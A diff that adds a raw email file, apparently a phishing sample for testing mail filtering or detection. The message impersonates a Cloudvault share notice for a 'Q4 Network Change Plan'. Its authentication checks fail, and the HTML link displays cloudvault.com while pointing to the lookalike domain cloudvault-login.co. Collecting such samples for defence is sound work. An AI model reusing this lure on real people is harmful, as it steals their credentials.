@@ -1,0 +1,32 @@
+Authentication-Results: mx.halvorsenmachining.com; spf=softfail
+ smtp.mailfrom=cloudvault.com; dkim=fail header.d=mailer-relay9.info;
+ dmarc=fail header.from=cloudvault.com
+From: Cloudvault <notifications@cloudvault.com>
+To: Dana Ortiz <dana.ortiz@halvorsenmachining.com>
+Subject: Keystone IT shared "Q4 Network Change Plan.xlsx" with you
+Date: Tue, 22 Sep 2026 08:30:41 -0400
+Message-ID: <179020357098.226.11868990898077904205@cloudvault.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+ boundary="===============4182512079230479552=="
+
+--===============4182512079230479552==
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: 7bit
+
+Keystone IT shared a file with you.
+
+Q4 Network Change Plan.xlsx
+
+Open: https://cloudvault.com/f/Q4-plan
+
+--===============4182512079230479552==
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+MIME-Version: 1.0
+
+<p>Keystone IT shared a file with you.</p><p><b>Q4 Network Change Plan.xlsx</=
+b></p><p><a href=3D'http://cloudvault-login.co/auth?next=3DQ4-plan'>https://c=
+loudvault.com/f/Q4-plan</a></p>
+
+--===============4182512079230479552==--
